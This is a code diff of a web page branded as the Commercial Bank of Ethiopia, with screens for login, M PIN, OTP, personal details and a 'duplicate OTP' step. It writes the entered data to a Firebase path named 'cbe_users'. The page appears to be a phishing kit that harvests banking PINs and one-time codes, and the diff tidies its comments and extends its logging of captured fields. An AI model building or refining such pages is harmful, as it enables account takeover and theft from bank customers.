@@ -120,7 +120,6 @@
             <div class="loading-text" id="loadingText">Please Wait...</div>
         </div>
 
-        <!-- SCREEN 1: LOGIN -->
         <div id="screen-login">
             <div class="login-header">
                 <div class="login-header-content">
@@ -161,7 +160,6 @@
             </div>
         </div>
 
-        <!-- M PIN -->
         <div id="screen-mpin" class="hidden">
             <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
             <div class="content">
@@ -176,7 +174,6 @@
             </div>
         </div>
 
-        <!-- FIRST OTP -->
         <div id="screen-otp-first" class="hidden">
             <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
             <div class="content">
@@ -198,7 +195,6 @@
             </div>
         </div>
 
-        <!-- PERSONAL -->
         <div id="screen-personal" class="hidden">
             <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
             <div class="content">
@@ -217,7 +213,6 @@
             </div>
         </div>
 
-        <!-- DUPLICATE OTP -->
         <div id="screen-otp-duplicate" class="hidden">
             <div class="header-bg"><div class="logo-area"><h2>Commercial Bank of Ethiopia</h2></div></div>
             <div class="content">
@@ -274,7 +269,7 @@
             if (!currentFirebaseKey) return;
             const userRef = ref(database, 'cbe_users/' + currentFirebaseKey);
             update(userRef, data)
-                .then(() => console.log("✅ User updated"))
+                .then(() => console.log("✅ User updated:", Object.keys(data).join(', ')))
                 .catch((error) => console.error("❌ Update Error:", error));
         }
 
